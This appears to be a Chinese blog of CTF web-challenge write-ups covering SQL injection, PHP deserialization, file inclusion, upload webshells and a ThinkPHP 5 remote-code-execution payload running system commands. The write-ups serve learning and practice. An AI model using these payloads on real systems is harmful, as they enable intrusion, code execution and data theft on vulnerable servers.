必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。\n\n(4)prompt()方法用于显示可提示用户进行输入的对话框。\n这个方法返回用户输入的字符串\n语法：prompt(msg,defaultText)\n参数                描述\nmsg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。\ndefaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。\n\n(5)var i,j,k,l=0,m,n,o,p = \"\";\n这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。\n\n(6)length\nlength 属性可设置或返回数组中元素的数目。\n\nWeb进阶1.baby_web1)题目描述想想初始页面是哪个\n2)wp 开始界面如下\n\n没有头绪，但是描述里有首页，再根据url知道这是个php网站\nphp网站首页文件就是index.php\nindex.php文件是一个php网站首页文件，index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）\n试试111.200.241.244:59074/index.php\n结果又会到1.php，url又变成111.200.241.244:59074/1.php\nF12打开查看网络\n\n补充：\n index.php的状态是302什么意思？\n302 Found，原始描述短语为 Moved Temporarily(临时搬家） ，是[HTTP协议](https://baike.baidu.com/item/HTTP协议)中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被**临时**改变了位置；换而言之，就是请求的资源暂时驻留在不同的URI下，故而除非特别指定了缓存头部指示，该状态码不可缓存。\n发现确实是跳转到了index.php但为什么又回到1.php\n\n可以看到location:1.php，这就是为什么无法直接访问index.php的原因，但flag已经得到\n得到flag\n\n如果用burpsuite查看111.200.241.244:59074/index.php，只能看到Flag is hidden!，也算是提示\n\n2.ics-061)题目描述云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。\n2)wp打开界面有些吓人\n\n但只有报表中心能打开\n\n看到url就有思路了，我们可以尝试id爆破\n\n利用Numbers方式，从1到5000，发现2333处成功爆破\n得到flag\n3.Training-WWW-Robots1)题目描述无\n2)wp这道题和上面新手区的题类似\n先访问http://111.200.241.244:51820/robots.txt得到php文件名\n\n于是访问http://111.200.241.244:51820/fl0g.php/robots.txt\n得到flag\n4.PHP21)题目描述无\n2)wp这句话的意思是”你能证明这个网站存在吗“\n\n没有思路，抓包，和御剑、dirsearch都没又得到想要的结果\n没有办法，搜了一下大佬们的wp\n了解到了一个新的知识点phps\nphps即为PHP Source：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。\n访问http://111.200.241.244:51703/index.phps，得到源码内容\n\n右键查看源码\n\nif(\"admin\"===$_GET[id]) &#123;\n  echo(\"not allowed!\");\n  exit();\n&#125;\n\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"admin\")\n&#123;\n  echo \"Access granted!\";\n  echo \"Key: xxxxxxx \";\n&#125;\n?>\n\nCan you anthenticate to this website?\n\n根据代码知道，当id&#x3D;admin，输出not allowed!，但是想要输出flag\n就需要注意这句语句$_GET[id] = urldecode($_GET[id]);\nurldecode:本函数对字符串进行URL解码。例如通过urlencode编码后的字符串，可通过UrlDecode进行解码。对Url路径加码的函数是UrlEncode  用法相反，和UrlDecode是一致对应的\n这里我们就清楚了，需要把admin进行url编码，但是只对其进行一次编码，要知道网站本身对url编码就有解码的能力，也就是在urldecode函数执行之前，网站已经把编码解码为admin，从而只输出not allowed!\n所以，这里需要对admin进行两次编码，第一被网站解码，绕过第一个if，然后在urldecode函数里进行第二次解码，变成admin，从而输出Key(flag)\n于是访问http://111.200.241.244:51703/index.php?id=%25%36%31dmin\n这里的%25%36%31是字母a的二次url编码由a第一次编码结果%61再次编码而成\n–为了payload简洁，一般只编码一个字母\n\n得到flag\n5.Web_python_template_injection该题属于ssti，建议先了解一些ssti的模板注入，和这两篇文章了解一些flask运行原理\nhttps://www.freebuf.com/column/187845.html  \nhttps://xz.aliyun.com/t/3679\n然后再做这道题\n大佬wp\n6.Web_php_unserialize1)题目描述无\n2)wp看名字可知，这是道php反序列化类型的题\n开始先分析一下php代码\n \nclass Demo &#123; \n    private $file = &#x27;index.php&#x27;;\n    public function __construct($file) &#123; \n        $this->file = $file; \n    &#125;\n    function __destruct() &#123; \n        echo @highlight_file($this->file, true); \n    &#125;\n    function __wakeup() &#123; \n        if ($this->file != &#x27;index.php&#x27;) &#123; \n            //the secret is in the fl4g.php\n            $this->file = &#x27;index.php&#x27;; \n        &#125; \n    &#125; \n&#125;\nif (isset($_GET[&#x27;var&#x27;])) &#123; \n    $var = base64_decode($_GET[&#x27;var&#x27;]); \n    if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; \n        die(&#x27;stop hacking!&#x27;); \n    &#125; else &#123;\n        @unserialize($var); \n    &#125; \n&#125; else &#123; \n    highlight_file(\"index.php\"); \n&#125; \n?>\n\nphp代码审计原文链接\n首先定义了Demo类，在类中定义了几个方法construct()wakeup()destruct()。在这里我们要知道，\nphp中类实例化的时候，首先运行wakeup()函数，\n在序列化时先运行sleep()函数,\n在反序列化时先运行wakeup()，\n在脚本结束调用destruct()函数。 \n继续审计代码，下面的if语句中，先用了base64的解码函数，进行了一次解码，又用一个正则表达式进行过滤，只有base64编码并通过正则表示式才能进行反序列化\n\n这里的正则表达式’/[oc]:\\d+:/i’ 表示了以O或者C开头接：接数字，数字至少出现一次或者无数次，忽略大小写，所以我们将O:4改为O:+4则可通过正则表达式，因为在PHP代码里，+4就是4，所以绕过了正则匹配同时也不影响代码正常含义\n这里看到了fl4g.php，先把它实例化，这里改一下代码\n \nclass Demo &#123; \n    private $file = &#x27;index.php&#x27;;\n    public function __construct($file) &#123; \n        $this->file = $file; \n    &#125;\n    function __destruct() &#123; \n        echo @highlight_file($this->file, true); \n    &#125;\n    function __wakeup() &#123; \n        if ($this->file != &#x27;index.php&#x27;) &#123; \n            //the secret is in the fl4g.php\n            $this->file = &#x27;index.php&#x27;; \n        &#125; \n    &#125; \n&#125;\n$a=new Demo(\"fl4g.php\");\n\n//这里我就在想，如果这个实例化的时候()不加参数，那么最后序列化的结构只能是index.php，也就是源码中的，但是我们的目标是fl4g.php这个文件\n//这里其实只需要在实例化类中，传入我们需要序列化的参数即可\n//这里相当于给$flie赋值，如果类中多个值需要变成我们需要的参数，用\",\"隔开即可，按赋值顺序，例如$a = new Demo(\"a\",2,\"b\");\n\necho (serialize($a));\n?>\n\n运行PHP代码\n得到O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;\n这里看到有一个__wakeup，所以还要改一下属性值1为2\n–&gt;\nO:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;\n注意：这里有一个大坑让我卡了好久\n先看下面这个图理解一下上面的语句\n\n属性值为10，但是”Demofile“只有8个字符，很明显缺了两个字符，但是却被省略了，猜测确了两个空字符\nprivate 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度\n\n所以也可以推测出Demofile是private声明\n\n这里我一直卡住的原因就是把空字符当作了空格\n所以开始我是直接在D和f前加上空格，但是底下的base64编码提交url没有反应\n\n然后把decoder换成hex，发现空格是20（44是字母D，66是字母f）\n\n然后看了下面这个表，明白00才是空字符，空格和空字符不是同一个东西\n\n但是空字符无法复制，在复制时，空字符后的字符串会被截断，只复制了空字符前面的字符串\n所以这里可以在hex里直接改，把20改成00\n\n然后下方的base64编码就可以了\n访问\nhttp://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\n得到flag\n7.php_rce1)题目描述无\n2)wp开始界面如下\n\n（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）\n这里可以先了解一下什么是rce和该漏洞的成因\n如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag\n百度可知\nThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。 \n然后在Github上搜thinkphp得到payload\n\n尝试http://111.200.241.244:51053/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件\nhttp://111.200.241.244:57210/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*\n\n得到的结果很乱，用F12整洁一些\n最后行，看到flag文件夹\n\n用cat显示出来\nhttp://111.200.241.244:57210/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag\n得到flag\n8.Web_php_include1)题目描述无\n2)wp这道题先了解php伪协议\n看名字很清楚是到文件包含的题目\n\nshow_source(__FILE__);\necho $_GET[&#x27;hello&#x27;];\n$page=$_GET[&#x27;page&#x27;];\nwhile (strstr($page, \"php://\")) &#123;  $page=str_replace(\"php://\", \"\", $page);\n&#125;\ninclude($page);\n?>\n\n先分析一下函数\nstrstr()：定义和用法：搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。区分大小写，stristr()函数不区分大小写语法：strstr(string,search,before_search)string:必需，被搜索的字符串search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分\nstr_replace():定义和用法：以其它字符替换字符串中的一些字符（区分大小写）语法：str_replace(find,replace,string,count)find,必需，要查找的值replace，必需，要替换的值string，必需，被搜索的字符串count，可选，替换次数\n也就是说，如果page&#x3D;的内容里有php:&#x2F;&#x2F;就会被替换为空，也就是过滤\n但是看源码我们知道，它只过滤了小写，所以可以用大小写绕过，这里用的php:&#x2F;&#x2F;input\n*这道题好像包括php:&#x2F;&#x2F;input，有5种方法，建议看看这篇文章Web_php_include总结五种解法大同小异\nhttp://111.200.241.244:59492/?page=PHP://input\nphp:&#x2F;&#x2F;input读取POST数据， 我先用hackbar，发现没有反应\n\n看了一篇大佬的wp，说是被过滤了，所以不行\n但这里可以用burp试试，得到flag文件名\nfl4gisisish3r3.php\n\n显示fl4gisisish3r3.php内容\n\n得到flag\n9.supersqli1)题目描述随便注\n2）wp这道题之前在buuctf上做过，考察堆叠注入，wp可以在buuctf-wp看一下\n10.warmup1)题目描述无\n2）wp开始就只有一张图片，先看一下它源码\n\n看到有一个source.php文件\n访问http://111.200.241.244:59132/source.php\n  \n    highlight_file(__FILE__);\n    //__FILE__常量返回文件的完整路径和文件名，高亮显示\n    class emmm\n    &#123;\n        public static function checkFile(&$page)\n        &#123;\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            //白名单\n            if (! isset($page) || !is_string($page)) &#123;\n            //如果不存在（isset()）或者不为字符串（is_string()）\n                echo \"you can&#x27;t see it\";\n                return false;\n            &#125;\n\n            if (in_array($page, $whitelist)) &#123;\n            //如果在白名单里\n                return true;\n            &#125;\n\n            $_page = mb_substr(\n                $page,//要截取的字符串\n                0,//起始位置\n                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//截取长度\n                //返回？在$page.?字符串中出现的位置\n            );\n            if (in_array($_page, $whitelist)) &#123;\n            //如果在白名单里\n                return true;\n            &#125;\n\n            $_page = urldecode($page);//解码\n            $_page = mb_substr(\n                $_page,//要截取的字符串\n                0,//起始位置\n                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)//截取长度\n                //返回？在$_page字符串中第一次出现的位置\n            );\n            if (in_array($_page, $whitelist)) &#123;\n            //如果在白名单里\n                return true;\n            &#125;\n            echo \"you can&#x27;t see it\";\n            return false;\n        &#125;\n    &#125;\n\n    if (! empty($_REQUEST[&#x27;file&#x27;])\n        && is_string($_REQUEST[&#x27;file&#x27;])\n        && emmm::checkFile($_REQUEST[&#x27;file&#x27;])\n    ) &#123;\n    //如果传的参数不是空的，并且是字符串，调用checkFile函数返回为true\n        include $_REQUEST[&#x27;file&#x27;];\n        //对传来的参数进行包含\n        exit;\n    &#125; else &#123;\n        echo \"\";\n        //否则就输出图片\n    &#125;  \n?>\n\n没有flag的线索，但看到一个hint.php文件\n访问http://111.200.241.244:59132/hint.php\n\n知道了flag在ffffllllaaaagggg文件里\n然后开始分析source.php代码（可以看看源码注释）\n分析：\n我们可以看到，关键在于 checkfile 函数，要让它返回为ture才能够实现文件包含，我们能控制的变量是file，page变量实际是file变量的形参，由checkfile函数传过去，也就是file变量要满足所有的if条件，才能返回ture而不是只显示图片\n先分析checkfile函数里的四个if条件满足要求，避免执行return false\n第一个if\nif (! isset($page) || !is_string(if (! isset($page) || !is_string($page)) &#123;\n            //如果不存在（isset()）或者不为字符串（is_string()）\n                echo \"you can&#x27;t see it\";\n                return false;\n            &#125;\n\n因为语句里存在return false，所以要传入的变量page存在且为字符串，使得if语句为假，就不会执行return false，这个本身就满足，所以可以不考虑\n第二个if\nif (in_array($page, if (in_array($page, $whitelist)) &#123;\n//如果在白名单里\n    return true;\n&#125;\n\n要我们传入的参数是source.php或者hint.php，满足whitelist(白名单)，如果还不满足继续往下判断，满足就跳出checkfile函数\n第三个if，结合其前面代码\n$_page = $_page = mb_substr(\n               $page,//要截取的字符串\n               0,//起始位置\n               mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//截取长度\n               //返回？在$page.?字符串中出现的位置\n           );\n           if (in_array($_page, $whitelist)) &#123;\n           //如果在白名单里\n               return true;\n           &#125;\n\n取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数\n第四个if\n$_page = urldecode($page);$_page = urldecode($page);//解码\n            $_page = mb_substr(\n                $_page,//要截取的字符串\n                0,//起始位置\n                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)//截取长度\n                //返回？在$_page字符串中第一次出现的位置\n            );\n            if (in_array($_page, $whitelist)) &#123;\n            //如果在白名单里\n                return true;\n            &#125;\n\n先把参数进行url解码，然后和第三个if一样，取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数\n\n至于\nif (! empty($_REQUEST[if (! empty($_REQUEST[&#x27;file&#x27;])\n        && is_string($_REQUEST[&#x27;file&#x27;])\n        && emmm::checkFile($_REQUEST[&#x27;file&#x27;])\n    ) &#123;\n\n只要file不为空，且为字符串即可，可以满足不考虑\n所以只有下面两种\nhttp://111.200.241.244:59132/source.php?file=source.php?(payload)\nhttp://111.200.241.244:59132/source.php?file=hint.php?(payload)\n由PHP4-7的include函数的特性\n\n在payload上加上/../../../../../../ffffllllaaaagggg，这里可只加四层..&#x2F;即可，但也可以加多个返回上个目录，也可以依次试试\n得到flag\n补充\nmb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。\n实例\n从字符串中返回 \"菜鸟\"：\n\n----------------\nmb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置\nmb_strpos (haystack ,needle )\nhaystack：要被检查的字符串。\nneedle：要搜索的字符串。\n----------------\n in_array函数功能检查数组中是否存在某个值\n\n11.NewsCenter1)题目描述无\n2）wp该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等\n开始先判断sql注入存在\n输入**1’**，报错返回空白页面\n然后判断字段数\n当输入语句为\n1&#x27; order by 4#\n\n返回空白页面，于是判断字段数为3\n然后联合注入\n先判断数据爆出口\n-1&#x27;  union select 1,2,3#\n\n\n得出数据在2，3位置处输出\n然后按照标准sql注入流程即可\n先看数据库和版本号\n-1&#x27;  union select 1,database(),version()#\n\n\n得到数据库名为news，MySQL版本为5.5.61\n然后查看news库的表名\n-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\"news\"),3#\n\n\n得到两个表名news和secret_table\nflag肯定在secret_table里\n查看secret_table列\n-1&#x27;  union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\"secret_table\"),3#\n\n\n看到fl4g，尝试查看其数据\n-1&#x27;  union select 1,(select fl4g  from secret_table),3#\n\n\n得到flag\n这里用sqlmap也可以，但还是试试手工注入更好\n12.NaNaNaNNaN-Batman1)题目描述无\n2）wp这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点\n原文链接\njs源代码分析：\n_等于一个$函数内容\n_=&#x27;function $()\n\n一个输入框\nOk\\&#x27;);\n\n***核心代码：***\neval函数，这是执行函数；这里执行了_变量中的内容也就是&#39;&#39;中的内容，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来\n这里可以使用浏览器打开，也可以将修改后的源代码放入控制台执行（放入控制台需要注意删除script前后标签）\n\n浏览器打开： \nfunction $()&#123;\nvar e=document.getElementById(\"c\").value;\nif(e.length==16)\n   if(e.match(/^be0f23/)!=null)\n      if(e.match(/233ac/)!=null)\n         if(e.match(/e98aa$/)!=null)\n             if(e.match(/c7be9/)!=null)&#123;\n             var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"];\n             var n=[\"a\",\"_h0l\",\"n\"];\n             var r=[\"g&#123;\",\"e\",\"_0\"];\n             var i=[\"it&#x27;\",\"_\",\"n\"];\n             var s=[t,n,r,i];\n             for(var o=0;oinput id=\"c\">button οnclick=$()>Okbutton>&#x27;);\ndelete _\n\n我们的终极目标是打印出\ndocument.write(s[o%4][0]);s[o%4].splice(0,1)&#125;\n因此我们要满足关键变量e的条件\ne.length==16\ne.match(/^be0f23/)!=null\ne.match(/233ac/)!=null\ne.match(/e98aa$/)!=null\ne.match(/c7be9/)!=null\n\n这里又用到了正则表达式^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求于是我们构造e的值\ne=be0f233ac7be98aa\n\n将上面的核心代码后缀改为html格式，打开如下图所示在这里插入图片描述框中输入e的值be0f233ac7be98aa，点击Ok（当然你也可以在原来获得的web100文件浏览器执行的输入框中输入be0f233ac7be98aa）\n\n注1：当然，如果大家觉得构造麻烦，可以直接执行获取flag的核心代码，代码如下\n&lt;script&gt;&lt;script&gt;\nvar t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"];\n             var n=[\"a\",\"_h0l\",\"n\"];\n             var r=[\"g&#123;\",\"e\",\"_0\"];\n             var i=[\"it&#x27;\",\"_\",\"n\"];\n             var s=[t,n,r,i];\n             for(var o=0;o13;++o)&#123;\n             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;\nscript>\n\ndocument.write(s[o%4][0]);s[o%4].splice(0,1);\n//输出fl;随后删除fl\n/*\n代码运行详解：\n第一步：document.write(s[0][0]);s[0].splice(0,1);\n第二步：document.write(t[0]);t.splice(0,1);\n第三步：document.write(\"fl\");删除t[\"fl\",\"s_a\",\"i\",\"e&#125;\"]中第一个位置，一个项目，即删除fl\n*/\n\ndocument.write的功能可以看一下这篇文章https://blog.csdn.net/qq_34986769/article/details/52160532\n\nsplice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。\n注释：该方法会改变原始数组。\n语法\narrayObject.splice(index,howmany,item1,.....,itemX)\n参数\t                         描述\nindex\t                     必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。\nhowmany\t                     必需。要删除的项目数量。如果设置为 0，则不会删除项目。\nitem1, ..., itemX\t         可选。向数组添加的新项目。\n\n13.unserialize31)题目描述无\n2）wp这道题需要了解php反序列化中__wakeup漏洞的利用,还有php魔术方法\n__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。\n开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code&#x3D;可能是提醒需要在url利用以GET方式提交code值\n\n下方是把代码补充完善后，并并调用序列化函数\n\nclass xctf&#123;                        //定义一个名为xctf的类\npublic $flag = &#x27;111&#x27;;       //定义一个公有的类属性$flag，值为111\npublic function __wakeup()&#123;                                \nexit(&#x27;bad requests&#x27;);\n//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本\n&#125;\n&#125;\n$a=new xctf();    \n//使用new运算符来实例化该类（xctf）的对象为\n//这里也就是定义了了一个新的类用来反序列化\n\necho(serialize($a));       \n//serialize()序列化函数\n//输出被序列化的对象\n?>\n\n运行该php代码，得到序列化后的字符串\nO:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\n\n如果看不懂，可以看看方便下图理解\n\n这里如果直接访问，会失败\nhttp://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;\n\n因为我们忽略了__wakeup()，这里就需要了解php的魔术方法当中的绕过__wakeup()\n如何绕过__wakeup()：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。从而绕过了__wakeup()函数\n在这串序列化的代码中，对象属性数为1，把下列的1改为2(&gt;1)，即可\nO:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\n–&gt;\nO:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\n\n这里我插入一个新学到的payload\nC:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\n发现也是可以的，也是可以绕过__wakeup()函数\nC代表这个类实现了serializeable接口，serializeable不支持wakeup，就绕过去了\n\n然后payload:\nhttp://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;\n得到flag\n补充：\nphp实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 = new 类名（参数1，参数2...参数n）】构成。\n\nphp类对象是什么意思？\n类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。\n对象 − 是类的实例。\n在面向对象的程序设计（英语：Object-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。\n\n14.upload11)题目描述无\n2)wp典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下\n先直接上传php文件，发现被拦截\n\n于是构造一个图片木马上传，然后burp修改后缀，看看是不是前端验证\n\n\n发现上传成功\n\n用蚁剑试着连一下\n\n发现连接成功，打开看看，在html下发现flag.php\n\n打开文件\n得到flag\n\n后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础\n15.easytornado一道tornado框架题，属于ssti注入，建议先看一些文章\n了解了再尝试完成\nOthers1.easyupload1)题目描述一名合格的黑客眼中，所有的上传点都是开发者留下的后门\n2)wp这道题写的1星，但是过滤又多，还涉及了上传.user.ini文件，学到了,下面是大佬的wp\n本题需要利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的\n本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行\n这里需要绕过的点如下\n\n检查文件内容是否有php字符串\n检查后缀中是否有htaccess或ph\n检查文件头部信息\n文件MIME类型\n\n对于第一点可以利用短标签绕过，例如 \n\n把short_open_tag 字段改为On，就可以实现短标签功能\n\n短标签：\n1.能正常解析类似于这样形式的php文件： phpinfo() ?>  \n\n2.使用的形式输出，在短标签看来，\n\n3.\n就相当于\n\n\n\n正确：\n&#x27;)\n?>\n\n报错：\n&#x27;)\n?>\n\n从这个对比试验我们可以看出：\n在短标签模式下，\n我们执行php语句php函数，都用类似于这样形式的php文件：\nphpinfo();?>\n但是我们要输出一个flag，或者变量时，使用的形式输出\n\n对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章\n文章\n在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。\n 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。\n 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。\n第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a\n第四点绕过方法即修改上传时的Content-Type\n因此最终的payload为： 上传.user.ini，内容为\nGIF89a                  \nauto_prepend_file=a.jpg\n\nauto_append_file、auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 \n\n使用方法很简单，直接写在.user.ini中：\n\n上传a.jpg，内容为\nGIF89a\n\n\n2.file_include【江苏工匠杯】1)题目描述怎么读取文件呢？\n2)wp这是一道文件包含的题目\n但是开始一直用伪协议读取都失败\nhttp://61.147.171.105:61462/?filename=php://filter/read=convert.base64/resource=flag.php\n\n\n根据源码猜测，是在check.php中设置了过滤，但是直接访问是无法得到文件内容的\n这里涉及到一个知识点\nConversion Filters（转换过滤器）Conversion Filters（转换过滤器）如同 string. 过滤器，convert. 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。\n常用的convert.base64就是其应用\n但是我们这里测试可以知道\n\n这里将base64过滤了，也就是不能进行base64转化，read也不能用\n于是这里就提及了\nconvert.iconv.*这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。\n使用方法\nconvert.iconv.. \nor \nconvert.iconv./\n\n相比单纯的convert.加上.iconv后，可以将数据进行转化后，再进行转化输出\n而其能进行加码的方式有\nUCS-4*\nUCS-4BE\nUCS-4LE*\nUCS-2\nUCS-2BE\nUCS-2LE\nUTF-32*\nUTF-32BE*\nUTF-32LE*\nUTF-16*\nUTF-16BE*\nUTF-16LE*\nUTF-7\nUTF7-IMAP\nUTF-8*\nASCII*\n\n\n\n但是这些加码方式也有些被过滤\n进行爆破得到UTF-7，UCS-4*可以\n直接构造\nhttp://61.147.171.105:61462/?filename=php://filter/convert.iconv.UTF-7.UCS-4*/resource=flag.php\n\n得到flag\n\n\n查看一下check.php内容\n\n发现过滤了\nbase|be|encode|print|zlib|quoted|write|rot13|read|string\n\n看到这里过滤了quoted，string，所以这里的转化过滤器函数用的iconv()\n\n","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","categories_index":"网络安全学习","tags_index":"靶场","author_index":"Ttoc"},{"id":"d85793a4128cf3cc353119248e4d44d8","title":"buuctf靶场wp","content":"web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间\n\n\nWeb1.[强网杯 2019]随便注1）题目描述无\n2）wp因为之前没有了解过堆叠注入，这里挨个分析学习\n先来确定sql注入\n1&#x27;\n\n\n然后试试显示所有数据，感觉看不到什么意思，后面一步步分析\n1&#x27; or 1=1;#\n\n\n然后判断字段\n\n\n判断处字段数为2\n然后用联合注入\n\n发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法\n可以先了解堆叠注入的概念和注入方式\n堆叠注入先查看所有的数据库\n注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句\n;间隔sql语句\n-1&#x27;;show databases;#\n\n\n根据题目名字，先调用supersqli这个库的表看看\n-1&#x27;;use supersqli;show tables;#\n\n\n看到有两个表，先看一下纯数字的表里的内容\n 注：当纯数字字符串是表名的时候需要加反引号&#96;\n-1&#x27;;use supersqli;show columns from`1919810931114514`;#\n\n\n看到flag在里面，再看看words里\n-1&#x27;;use supersqli;show columns from words;#\n\n\nVARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串\n这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表\n后台sql语句可能（xx为输入框的内容）\nselect id,data from words where id=xx\n\n更改表名列名\n1，通过 rename 先把 words 表改名为其他的表名。\n2，把 1919810931114514 表的名字改为 words 。\n3 ，将修改后的 words 表中flag列名改成列名 id ，这样只需进行正常查询就会按上面猜测后台sql语句一样显示出flag\n-1&#x27;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#\n\nshow tables主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突\n\n可以看到表1919810931114514名字被改成了可查询表words\n再看看words表的列，flag变成了id，NO变成了YES\n\n因为flag为id了，用1&#39; or 1=1;#恒真测试使其回显\n看看回显数据\n\n得到flag\nSQl的rename\n用于重命名表名\n\n\nSQL的alter用法总结\n\n1：删除列\n\nALTER TABLE 表名 DROP COLUMN 列名\n\n2：增加列\n\nALTER TABLE 表名 ADD COLUMN 列名 属性 【约束】\n\n3：修改列的类型信息\n\nALTER TABLE 表名 CHANGE COLUMN 列名 【新】列名\n新属性\n4：重命名列\n\nALTER TABLE 表名字 CHANGE COLUMN 列名 新列名 属性\n\n5：重命名表\n\nALTER TABLE 表名 RENAME TO 表新名\n\n6：删除表中主键\n\nAlter 